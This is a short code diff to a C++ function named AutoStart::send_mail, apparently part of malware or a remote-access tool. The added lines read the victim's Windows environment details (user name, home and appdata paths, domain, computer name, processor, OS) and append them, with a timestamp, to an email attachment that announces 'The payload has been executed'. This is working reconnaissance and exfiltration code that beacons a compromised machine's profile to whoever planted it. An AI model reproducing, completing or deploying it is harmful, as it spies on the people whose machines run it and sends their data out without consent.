@@ -235,8 +235,24 @@ bool AutoStart::send_mail()
 		attachment << "To: " << rcpt_name << " " << "<" << mail_rcpt << ">" << std::endl;
 		attachment << "Subject: " << subject << std::endl;
 		attachment << "Cc:" << std::endl;
+
+		std::string buffer;
+		std::string user = getenv("USERNAME");
+		std::string userhome = getenv("HOMEPATH");
+		std::string windir = getenv("windir");
+		std::string localappdate = getenv("LOCALAPPDATA");
+		std::string systemdrive = getenv("SystemDrive");
+		std::string OS = getenv("OS");
+		std::string userdomain = getenv("USERDOMAIN");
+		std::string computername = getenv("COMPUTERNAME");
+		std::string proco = getenv("PROCESSOR_IDENTIFIER");
+
+		buffer = "\nCurrent user:\t\t\t " + user + "\nUser directory:\t\t\t " + userhome + "\nWindows directory:\t\t" + windir + "\nLocal Appdata:\t\t\t" + localappdate;
+		buffer += "\nSystem drive:\t\t\t" + systemdrive + "\nOS:\t\t\t\t\t" + OS + "\nComputer name:\t\t" + computername + "\nProcessor identifier:\t\t " + proco;
 		
 		attachment << "The payload has been executed" << std::endl;
+		attachment << std::string(dt) << std::endl;
+		attachment << buffer << std::endl;
 
 
 		attachment.close();
